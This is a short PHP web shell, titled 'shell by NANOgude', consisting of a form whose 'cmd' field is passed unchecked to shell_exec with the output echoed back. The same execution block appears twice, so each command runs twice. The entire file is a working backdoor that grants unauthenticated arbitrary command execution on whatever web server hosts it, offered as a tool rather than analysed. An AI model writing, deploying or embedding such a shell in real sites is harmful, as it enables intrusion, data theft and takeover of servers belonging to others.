<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shell by NANOgude</title>
</head>
<body>
    <h2>nanoHENG shell</h2>
    <form method="post">
        <label for="cmd">Command:</label>
        <input type="text" name="cmd" id="cmd" size="50">
        <input type="submit" value="Execute">
    </form>
    <br>
    <h3>Result:</h3>
    <div style="border:1px solid black; padding:10px;">
        <?php
        if (isset($_POST['cmd'])) {
            echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
        }
        ?>
    </div>
</body>
</html>
